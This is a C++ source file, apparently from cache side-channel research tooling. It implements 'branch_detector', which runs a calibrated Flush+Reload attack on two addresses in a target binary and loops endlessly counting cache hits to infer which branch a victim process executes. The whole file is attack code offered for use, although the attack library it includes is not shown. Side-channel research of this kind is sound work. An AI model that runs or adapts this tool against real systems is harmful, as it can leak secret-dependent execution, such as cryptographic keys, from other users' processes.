#include "../lib/attack/attack.hpp"
#include "../lib/sampling/sampler_primitives.hpp"
#include "../lib/sampling/samplers.hpp"
#include "../lib/utils/memory_wrapper.hpp"
#include "../main/utils/cacheutils.h"
#include "../main/utils/intel.h"
#include <iostream>

const size_t SAMPLE_MEASURE_DELAY = 50000;
const size_t BETWEEN_ITEMS_DELAY = 10000;
const double MIN_SCORE = 1.0;


Attack getAttack(char* path, size_t first_index, size_t second_index)
{
    MemoryWrapper wrapper(path);
    std::vector<size_t> indexes = { first_index, second_index };
    std::unique_ptr<FlushSamplerPrimitive> primitive = std::make_unique<FlushSamplerPrimitive>();
    std::unique_ptr<Sampler> sampler = std::make_unique<ListSampler>(indexes, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY, std::move(primitive));
    Attack attack(wrapper, AttackType::FlushReload, std::move(sampler));
    attack.calibrate();
    return attack;
}

int main(int argc, char* argv[])
{
    if (argc < 4)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }

    char* path = argv[1];
    int addr0 = std::strtol(argv[2], nullptr, 16);
    int addr1 = std::strtol(argv[3], nullptr, 16);

    if (addr0 <= 0 || addr1 <= 0)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }

    Attack attack = getAttack(path, addr0, addr1);

    uint total0 = 0;
    uint total1 = 0;
    while (true)
    {

        for (const AttackResult& result : attack.attack())
        {
            if (result.index == addr0 && result.score >= MIN_SCORE)
            {
//                std::cout << "Case 0 triggered with score: " << result.score
//                          << " Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
                total0++;
            }
            else if (result.index == addr1 && result.score >= MIN_SCORE)
            {
//                std::cout << "Case 1 triggered with score: " << result.score
//                          << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
                total1++;
            }
        }
    }
    return 0;
}
